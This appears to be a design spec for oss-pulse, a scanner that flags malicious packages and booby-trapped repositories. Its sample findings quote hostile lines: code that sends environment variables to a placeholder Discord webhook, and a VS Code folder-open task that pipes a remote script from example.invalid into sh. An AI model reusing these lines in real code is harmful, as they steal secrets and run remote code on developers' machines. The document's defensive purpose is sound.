   2 │ payload = json.dumps(dict(os.environ))
     │                      ^^^^^^^^^^^^^^^^
   3 │ HOOK = 'https://discord.com/api/webhooks/000/xxx'
     │         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  also matches CODE-EXFIL on line 3
```

</details>

<details><summary>Repository scan: 1 note</summary>

```text
note    .github/workflows/ci.yml has no permissions: block             GHA-PERMS
```

</details>

<sub>oss-pulse 0.1.0 on 4f2a9c1, 11 s. 11 dependencies, 9 release files and 214 repository files read; nothing installed or run. A finding is about a release, never about the people who maintain it. [How verdicts are decided](https://github.com/acme/oss-pulse/blob/v0.1.0/docs/RULES.md)</sub>
````

### clear: two lines, three with a note

````markdown
<!-- oss-pulse-report -->
### Clear: no rule matched in 11 dependencies or the repository

One note: `.github/workflows/ci.yml` has no `permissions:` block (GHA-PERMS).

<sub>oss-pulse 0.1.0 on 4f2a9c1, 11 s. 11 dependencies, 9 release files and 214 repository files read; nothing installed or run. Clear means no rule matched. It isn't an audit.</sub>
````

### Job summary

The same Markdown, appended to `$GITHUB_STEP_SUMMARY`, with every `<details>` open.

### Annotations

One `::error` per hold finding and one `::warning` per review finding, each on the line that caused it so it shows on the diff; nothing for watch. When the job fails, a last `::error` names the gate. Escape data with `%` as `%25`, `\r` as `%0D` and `\n` as `%0A`, and properties also with `:` as `%3A` and `,` as `%2C`, after `visible()`, so a scanned file can't start a new workflow command. The Action can skip the escaping by reading the JSON report in its github-script step and calling `core.error(message, {title, file, startLine})`, which escapes for you.

```text
::error file=requirements.txt,line=3,title=oss-pulse hold::evil-lib 0.2: OSV lists it as malicious (MAL-2026-0001, OSV-MAL)
::error file=requirements.txt,line=8,title=oss-pulse hold::corp-utils: your internal name is on public PyPI (CONF-001)
::error file=requirements.txt,line=6,title=oss-pulse hold::hijacked-lib 3.0: uploaded without the attestation 2.9 had (PROV-001) and 8 more findings
::error file=requirements.txt,line=7,title=oss-pulse hold::reqeusts 0.0.1: requests with u and e swapped (TYPO-001)
::warning file=requirements.txt,line=4,title=oss-pulse review::vuln-lib 1.0.0: GHSA-aaaa-bbbb-cccc (high), fixed in 1.0.1 (OSV-VULN)
::error title=oss-pulse::4 dependencies are on hold, and fail-on is hold, so this job fails. The job summary says what to do.
```

## 10. JSON and SARIF

Machine formats: no ANSI, no Markdown, no wrapping, no prose that changes between versions. The `--json` file keeps today's fields and adds:

- top level: `verdict`, `exit_status`, `coverage` (`files_read`, `files_total`, `not_read` as a list of `{path, reason}`, `incomplete`), and `not_checked` (a list of `{source, reason, fix}`; `degraded` stays as an alias for one release);
- each finding: `verdict`, `runs_on` (`open`, `install`, `commit`, `run`, `ci`, `settings`, or null for package findings), `grade`, `line`, `span` (start and end offsets into `evidence`, which is already escaped), `also_matches` (rule IDs with lines), `seen_in`;
- each dependency (check): `verdict`, `label` (`upkeep`, `source` or null), `line` (where it's declared).

```json
{"rule_id": "AUTO-VSCODE", "severity": "critical", "verdict": "hold", "runs_on": "open",
 "grade": "strong", "location": ".vscode/tasks.json:8", "line": 8,
 "evidence": "\"runOptions\": { \"runOn\": \"folderOpen\" }", "span": [16, 37],
 "also_matches": [{"rule_id": "CODE-DLEXEC", "line": 7}],
 "seen_in": "Contagious Interview, fake job interviews (named in 2023)"}
```

`--sarif` writes SARIF 2.1.0 for GitHub code scanning. `tool.driver` is `oss-pulse` with its version; each rule carries `shortDescription` (the title), `help` (the why), `helpUri` (`docs/RULES.md#rule-id`) and `properties` with `verdict`, `grade`, `runs_on` and `security-severity` (critical 9.5, high 8.0, medium 5.5, low 3.0). Each result's `level` follows the verdict: hold is `error`, review `warning`, watch and note `note`. Its `message.text` is the terminal sentence (`.vscode/tasks.json:8 runs a task when the folder opens`), and its region gives `startLine` plus `startColumn` and `endColumn` from `span`.

## 11. Rich and Typer

```python
# cli.py
import os
import sys
import click
import typer
from rich.console import Console
from rich.style import Style
from rich.text import Text

STYLES = {
    "hold": Style(bold=True, color="red"),
    "strong": Style(bold=True),
    "plain": Style(),
    "dim": Style(dim=True),
    "match": Style(underline=True),
}


def make_console(color: str, stream=sys.stdout) -> Console:
    """color is auto, always or never. Rich already honours NO_COLOR and FORCE_COLOR."""
    tty = stream.isatty() and os.environ.get("TERM") != "dumb"
    off = color == "never" or (color == "auto" and not tty)
    return Console(
        file=stream,
        highlight=False,
        emoji=False,
        markup=False,
        soft_wrap=False,
        force_terminal=(color == "always") or None,
        color_system=None if off else "standard",  # ANSI names only, never 256 or truecolour
        width=min(Console(file=stream).width, 100),
    )


def finding_line(verdict: str, path: str, says: str, rule: str, width: int) -> Text:
    t = Text("  ")
    t.append(
        verdict,
        STYLES["hold"]
        if verdict == "hold"
        else STYLES["strong"]
        if verdict == "review"
        else STYLES["dim"]
        if verdict == "note"
        else STYLES["plain"],
    )
    t.append(" " * (8 - len(verdict)))
    t.append(path)  # already visible()-escaped
    t.append(" " + says, STYLES["dim"])
    t.append(" " * max(2, width - t.cell_len - len(rule)))
    t.append(rule, STYLES["dim"])
    return t


class PlainHelp(typer.core.TyperGroup):
    def format_help(self, ctx, formatter):
        formatter.write(HELP_TEXT)  # the exact text in section 8


app = typer.Typer(
    cls=PlainHelp,
    rich_markup_mode=None,
    pretty_exceptions_enable=False,
    add_completion=False,
    no_args_is_help=True,
)


def main() -> None:
    """Entry point in pyproject: oss-pulse = "oss_pulse.cli:main"."""
    try:
        code = app(standalone_mode=False)
    except click.UsageError as exc:  # reworded into the error shape in section 6
        code = print_error(usage_message(exc))
    except OssPulseError as exc:  # UnsupportedFile, NoDependencies, PyPIUnreachable...
        code = print_error(exc)
    sys.exit(code or 0)
```

`rich_markup_mode=None` sends help through Click's plain formatter, which `PlainHelp` replaces; `pretty_exceptions_enable=False` stops the 30-line traceback. With `standalone_mode=False`, Click raises usage errors instead of printing its own `Usage: … Error:` block, so `main()` can word them.

## 12. Tests that keep this true

- Render every fixture through the real renderer at width 80 and compare with the examples in this file; fail on any line wider than 80.
- Under `NO_COLOR`, the output has `\x1b[1m`, `\x1b[2m` and `\x1b[4m` and no `\x1b[31m`. In a pipe it has no `\x1b` at all, and every underline is a caret line.
- The existing `HOSTILE` string, put into a path and an evidence line, comes out of the terminal, Markdown, annotation and SARIF renderers with no escape byte, no line starting `::`, no link, image, HTML or mention.
- `1 finding`, `2 findings`; no `hour(s)`.
- `anti_tells.py` over `src/`, `docs/`, `README.md` and `action.yml`: no emoji, banned words, em or en dashes, middle dots or bold lead-in bullets in user-facing strings.

## 13. README hero

The top of the README, as it should read. The console block is the real output, cut after the first finding.

````markdown
<p><picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/brand/logo-dark.svg">
  <img alt="oss-pulse" src="docs/brand/logo.svg" height="32">
</picture></p>

Triage for code you didn't write.

oss-pulse reads a repository someone sent you, or the Python packages you are about to install, and runs none of it. It tells you what would run, and when, and quotes the lines that say so.

```console
$ oss-pulse scan take-home

hold  Don't open this folder in VS Code, and don't install its dependencies.
      Opening it runs a script from example.invalid.

on open
  hold    .vscode/tasks.json:8 runs a task when the folder opens     AUTO-VSCODE
           7 │ "command": "curl -s https://example.invalid/a | sh",
           8 │ "runOptions": { "runOn": "folderOpen" }
```

Some fake job interviews send a take-home that runs code before you read a line of it. A VS Code task marked `"runOn": "folderOpen"` starts when you trust the folder, and an npm `postinstall` script runs during `npm install`. Security researchers named this the Contagious Interview campaign in 2023. `oss-pulse scan` reads the folder without opening it and needs no network. It exits 1 on hold, so `oss-pulse scan ~/take-home && code ~/take-home` won't open a folder that a hold rule matched.

```sh
pip install git+https://github.com/zahmed333/oss-pulse
oss-pulse scan ~/take-home          # a folder someone sent you
oss-pulse check requirements.txt    # the packages you are about to install
oss-pulse rules                     # what each rule matches, and the attack it came from
```

More: [what each verdict means](docs/RULES.md), [the GitHub Action](docs/github-action.md), [if your package was flagged](docs/flagged.md), [what it can't see](#limits).
````

The rest of the README follows the same rules: findings described in sentences rather than tables of bold questions, no emoji example table (paste real `oss-pulse check` output instead), no typed test or model counts, and a Limits section that says "clear means no rule matched" in those words.
